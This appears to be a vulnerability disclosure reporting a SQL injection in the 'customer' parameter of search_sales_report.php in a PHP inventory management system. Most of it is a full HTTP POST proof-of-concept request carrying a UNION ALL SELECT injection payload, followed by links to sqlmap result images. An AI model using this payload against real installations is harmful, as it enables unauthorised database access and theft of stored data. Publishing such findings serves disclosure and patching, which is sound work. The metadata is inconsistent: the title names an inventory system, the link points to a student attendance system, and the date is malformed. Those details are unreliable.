### Exploit Free and Open Source inventory management system - SQLi
### Date: 2024-02/23
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/17018/simple-student-attendance-system-using-php-and-mysql.html
### Version: 1.0
### Tested on: MacOs13.5 + phpstudy

# /app/ajax/search_sales_report.php（SQL injections）
/app/ajax/search_sales_report.php SQL injection exists for parameter customer

### Sample request POC #1

```
POST /app/ajax/search_sales_report.php HTTP/1.1
Host: 127.0.0.1:8889
Content-Length: 43
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8889
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8889/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=d2ms7dmo84iasdvoq0rhinhrl2
Connection: close

customer=-9350 UNION ALL SELECT 9630,9630,9630,9630,CONCAT(0x717a626b71,0x764248434c67444f4a7050646d6268436f486c7456587348744242525a66715147646b6369744a6c,0x717a767a71),9630,9630,9630,9630,9630,9630,9630,9630,9630#&issuedate=1-100
```
### Sqlmap running results
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1708927078851.jpg "Free and Open Source inventory management system")

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1708927196358.jpg "Free and Open Source inventory management system")
